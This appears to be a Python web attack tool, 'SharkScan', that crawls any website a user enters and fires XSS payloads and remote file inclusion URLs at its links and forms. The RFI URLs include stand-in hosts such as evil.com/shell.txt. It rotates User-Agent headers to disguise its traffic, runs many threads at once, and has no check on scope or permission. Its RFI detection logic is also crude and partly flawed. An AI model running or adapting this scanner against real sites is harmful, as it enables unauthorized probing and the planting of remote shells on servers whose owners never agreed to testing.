
import requests
from bs4 import BeautifulSoup
import urllib.parse
import random
import threading
import time
import os

# Define terminal color formatting for visibility
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# User-Agent list for request header randomization
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0',
    'Mozilla/5.0 (Linux; Android 7.0; Nexus 5 Build/NBD91U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36'
]

# More complex XSS payloads to bypass some basic filters
xss_payloads = [
    "<script>alert(1)</script>",
    "';alert(1);//",
    "\"><img src=x onerror=alert(1)>",
    "'><svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>"
]

# Common RFI payloads and URLs
rfi_payloads = [
    "http://evil.com/shell.txt",
    "http://malicious.com/evil.txt",
    "https://example.com/evil.php",
]

# Parameters that might be vulnerable to RFI
rfi_suspected_params = ['file', 'page', 'path', 'document', 'template', 'view']

# Extract all links, forms, and action URLs from a webpage
def extract_links(url):
    headers = {'User-Agent': random.choice(user_agents)}
    try:
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = [link.get('href') for link in soup.find_all('a') if link.get('href')]
        
        # Extract forms and action URLs
        forms = [form.get('action') for form in soup.find_all('form') if form.get('action')]
        return links + forms
    except Exception as e:
        print(f"{bcolors.FAIL}Error extracting links from {url}: {e}{bcolors.ENDC}")
        return []

# Scan for XSS vulnerabilities using both GET and POST methods
def scan_xss(url):
    headers = {'User-Agent': random.choice(user_agents)}
    vulnerable = False
    for payload in xss_payloads:
        # Test GET method
        test_url = f"{url}{urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, headers=headers, timeout=10)
            if payload in response.text:
                print(f"{bcolors.OKGREEN}[+] XSS Vulnerability found (GET): {test_url}{bcolors.ENDC}")
                vulnerable = True
        except Exception as e:
            print(f"{bcolors.FAIL}Error scanning {url} with GET: {e}{bcolors.ENDC}")
        
        # Test POST method
        try:
            response = requests.post(url, data={f"input": payload}, headers=headers, timeout=10)
            if payload in response.text:
                print(f"{bcolors.OKGREEN}[+] XSS Vulnerability found (POST): {url}{bcolors.ENDC}")
                vulnerable = True
        except Exception as e:
            print(f"{bcolors.FAIL}Error scanning {url} with POST: {e}{bcolors.ENDC}")
    
    return vulnerable

# Scan for RFI vulnerabilities
def scan_rfi(url):
    headers = {'User-Agent': random.choice(user_agents)}
    vulnerable = False
    
    # Check for RFI in query parameters
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    
    for param in params:
        if any(suspected in param.lower() for suspected in rfi_suspected_params):
            for payload in rfi_payloads:
                test_url = f"{url}&{param}={payload}"
                try:
                    response = requests.get(test_url, headers=headers, timeout=10)
                    if "evil" in response.text:
                        print(f"{bcolors.OKGREEN}[+] RFI Vulnerability found: {test_url}{bcolors.ENDC}")
                        vulnerable = True
                except Exception as e:
                    print(f"{bcolors.FAIL}Error scanning {url} for RFI: {e}{bcolors.ENDC}")
    
    return vulnerable

# Save results to file (.txt and .html)
def save_results(vulnerable_links, file_format="txt"):
    filename = f"SharkScan_results.{file_format}"
    if file_format == "txt":
        with open(filename, 'w') as file:
            for link in vulnerable_links:
                file.write(f"Vulnerable Link: {link}\n")
    elif file_format == "html":
        with open(filename, 'w') as file:
            file.write("<html><body><h1>SharkScan XSS & RFI Vulnerabilities</h1><ul>")
            for link in vulnerable_links:
                file.write(f"<li><a href='{link}'>{link}</a></li>")
            file.write("</ul></body></html>")
    
    print(f"{bcolors.OKBLUE}Results saved to {filename}{bcolors.ENDC}")

# Multithreaded XSS and RFI scanning
def shark_scan(url):
    print(f"{bcolors.HEADER}Starting XSS & RFI scan on: {url}{bcolors.ENDC}")
    all_links = extract_links(url)
    vulnerable_links = []

    def thread_worker(link):
        if scan_xss(link) or scan_rfi(link):
            vulnerable_links.append(link)

    threads = []
    
    # Add main URL to scan
    if scan_xss(url) or scan_rfi(url):
        vulnerable_links.append(url)

    # Create threads for each link to speed up the scan
    for link in all_links:
        if link.startswith("http"):
            t = threading.Thread(target=thread_worker, args=(link,))
            threads.append(t)
            t.start()

    # Join threads to ensure all scans complete
    for thread in threads:
        thread.join()

    # Save results to file (both .txt and .html)
    if vulnerable_links:
        print(f"{bcolors.OKBLUE}\nVulnerabilities found!{bcolors.ENDC}")
        file_format = input(f"{bcolors.BOLD}Choose file format to save results (txt/html): {bcolors.ENDC}").lower()
        save_results(vulnerable_links, file_format)
    else:
        print(f"{bcolors.WARNING}No XSS or RFI vulnerabilities found.{bcolors.ENDC}")

if __name__ == "__main__":
    target_url = input(f"{bcolors.BOLD}Enter website URL to scan for XSS & RFI vulnerabilities: {bcolors.ENDC}")
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    shark_scan(target_url)
